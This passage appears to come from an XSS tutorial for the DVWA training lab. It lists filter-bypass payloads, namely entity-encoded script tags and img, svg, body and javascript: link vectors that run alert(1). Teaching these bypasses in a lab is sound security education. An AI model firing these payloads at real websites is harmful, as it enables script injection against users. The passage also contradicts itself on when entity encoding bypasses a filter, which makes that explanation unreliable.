Bypass with HTML Entities

If the application decodes HTML entities before filtering, encoding the <script> tag can bypass the filter.

// Original filtered payload: <script>alert(1)</script> // Encoded payload attempt: &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;

Outcome: If the filter processes after entity decoding, this might work. Otherwise, it will still be blocked.

Key Takeaway

HTML entity encoding can bypass filters that don't decode before sanitization, while alternative tags exploit different browser parsing behaviors.

Bypass with Alternative Tags/Attributes

Many HTML tags and attributes can execute JavaScript. Experiment with these if <script> is blocked.

// Common alternative payloads: <img src=x onerror=alert(1)> <svg onload=alert(1)> <body onload=alert(1)> <a href="javascript:alert(1)">Click me</a>

Example: For DVWA Medium, <img src=x onerror=alert(1)> often works because the filter doesn't target the onerror attribute.
